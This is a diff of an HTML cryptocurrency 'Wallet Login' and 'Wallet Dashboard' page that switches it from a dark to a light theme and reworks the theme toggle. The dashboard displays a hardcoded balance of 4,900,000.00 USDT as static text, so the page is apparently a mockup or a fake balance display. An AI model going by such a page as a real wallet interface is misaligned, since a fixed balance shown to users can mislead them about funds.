@@ -8,91 +8,88 @@
   <style>
     body {
       margin: 0;
-      background: #0d1117;
-      color: #fff;
+      background: #f0f0f5;
+      color: #333;
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
       transition: background-color 0.3s, color 0.3s;
     }
     .container, .login-container {
-      background: #161b22;
-      border-radius: 12px;
+      background: #ffffff;
+      border-radius: 15px;
       padding: 25px 20px;
-      width: 92%;
+      width: 90%;
       max-width: 500px;
       margin: 40px auto;
-      box-shadow: 0 0 10px rgba(0,0,0,0.4);
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
     }
     .login-input {
       width: 100%;
       padding: 14px;
       margin-bottom: 16px;
-      border-radius: 8px;
-      border: 1px solid #30363d;
-      background: #1e2328;
-      color: #fff;
-      transition: background 0.3s ease, color 0.3s ease;
-    }
-    .login-input:focus {
-      background: #30363d;
-      color: #fff;
+      border-radius: 12px;
+      border: 1px solid #ddd;
+      background: #f7f7f7;
+      color: #333;
+      font-size: 16px;
     }
     .login-button, .logout-btn {
       width: 100%;
       padding: 14px;
-      background: #238636;
+      background: #4CAF50;
       color: white;
       border: none;
-      border-radius: 8px;
+      border-radius: 12px;
       font-size: 17px;
       font-weight: 600;
       cursor: pointer;
       transition: background-color 0.3s ease, transform 0.3s ease;
     }
     .login-button:hover, .logout-btn:hover {
-      background-color: #4CAF50;
+      background-color: #45a049;
       transform: scale(1.05);
     }
     .footer {
       position: fixed;
       bottom: 0;
       width: 100%;
-      background: #161b22;
+      background: #ffffff;
       display: flex;
       justify-content: space-around;
-      border-top: 1px solid #30363d;
+      border-top: 1px solid #ddd;
+      padding: 15px 0;
       z-index: 10;
-      padding: 10px 0;
     }
     .footer-btn {
       text-align: center;
-      color: #aaa;
-      font-size: 13px;
+      color: #333;
+      font-size: 14px;
       flex: 1;
       cursor: pointer;
     }
     .footer-btn i {
-      font-size: 20px;
+      font-size: 22px;
       display: block;
-      margin-bottom: 4px;
+      margin-bottom: 6px;
     }
     .footer-btn:hover {
-      color: #fff;
+      color: #4CAF50;
     }
     .modal {
       position: fixed;
       top: 0; left: 0; right: 0; bottom: 0;
-      background: rgba(0, 0, 0, 0.85);
+      background: rgba(0, 0, 0, 0.7);
       display: none;
       align-items: center;
       justify-content: center;
       z-index: 999;
     }
     .modal-content {
-      background: #161b22;
-      padding: 20px;
-      border-radius: 10px;
+      background: #fff;
+      padding: 25px;
+      border-radius: 15px;
       width: 90%;
       max-width: 400px;
+      text-align: center;
     }
     .balance {
       font-size: 18px;
@@ -107,52 +104,45 @@
       margin-top: 20px;
     }
     .crypto-icon {
-      width: 16px;
+      width: 20px;
       vertical-align: middle;
-      margin-right: 5px;
+      margin-right: 8px;
     }
     #themeToggle {
       position: fixed;
       top: 20px;
       right: 20px;
-      background: #238636;
+      background: #4CAF50;
       color: white;
       border: none;
-      padding: 10px 15px;
+      padding: 12px;
       font-weight: bold;
-      border-radius: 8px;
+      border-radius: 50%;
       cursor: pointer;
     }
-    @media (max-width: 768px) {
-      .container {
-        padding: 20px;
-        width: 95%;
-      }
-      .footer {
-        flex-direction: column;
-        padding: 15px;
-      }
-      .footer-btn {
-        font-size: 12px;
-      }
+    #themeToggle:hover {
+      background: #45a049;
     }
   </style>
 </head>
 <body>
 
-<button id="themeToggle" onclick="toggleTheme()">Toggle Theme</button>
+<!-- Dark/Light Mode Toggle -->
+<button id="themeToggle" onclick="toggleTheme()">🌙</button>
 
+<!-- Login Page (No Navbar) -->
 <div class="login-container" id="loginForm">
-  <h2 style="text-align:center;">Wallet Login</h2>
+  <h2 style="text-align:center; font-weight: 600; font-size: 24px; margin-bottom: 30px;">Wallet Login</h2>
   <input type="email" id="loginEmail" class="login-input" placeholder="Email" />
   <input type="password" id="loginPassword" class="login-input" placeholder="Password" />
   <button class="login-button" onclick="login()">Login</button>
-  <p style="color:red;" id="loginError"></p>
+  <p style="color:red; text-align:center;" id="loginError"></p>
 </div>
 
+<!-- Dashboard Page (With Navbar) -->
 <div class="container hidden" id="dashboard">
-  <h2>Wallet Dashboard</h2>
-  <div class="balance">
+  <h2 style="text-align:center; font-weight: 600; font-size: 24px;">Wallet Dashboard</h2>
+  <div class="balance" style="text-align:center; margin-top: 20px;">
     <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="crypto-icon" />
     Balance: 4,900,000.00 USDT<br>
     <img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" class="crypto-icon" />
@@ -162,6 +152,7 @@
   <iframe src="https://www.tradingview.com/widgetembed/?symbol=BINANCE:BTCUSDT&interval=15&theme=dark&style=1&toolbarbg=1e2328&withdateranges=1&hide_top_toolbar=1" frameborder="0"></iframe>
 </div>
 
+<!-- Footer Navbar -->
 <div class="footer hidden" id="footerNav">
   <div class="footer-btn" onclick="openModal('depositModal')">
     <i class="fas fa-arrow-down"></i>Deposit
@@ -250,24 +241,17 @@
     }
   }
 
-  let currentTheme = localStorage.getItem('theme') || 'dark';
-
   function toggleTheme() {
-    if (currentTheme === 'dark') {
-      document.body.style.backgroundColor = '#fff';
-      document.body.style.color = '#000';
-      currentTheme = 'light';
+    const body = document.body;
+    body.classList.toggle('dark');
+    document.getElementById('themeToggle').innerText = body.classList.contains('dark') ? '🌕' : '🌙';
+    if (body.classList.contains('dark')) {
+      body.style.backgroundColor = '#1e1e2f';
+      body.style.color = '#f0f0f5';
     } else {
-      document.body.style.backgroundColor = '#0d1117';
-      document.body.style.color = '#fff';
-      currentTheme = 'dark';
+      body.style.backgroundColor = '#f0f0f5';
+      body.style.color = '#333';
     }
-    localStorage.setItem('theme', currentTheme);
-  }
-
-  if (currentTheme === 'light') {
-    document.body.style.backgroundColor = '#fff';
-    document.body.style.color = '#000';
   }
 </script>
 
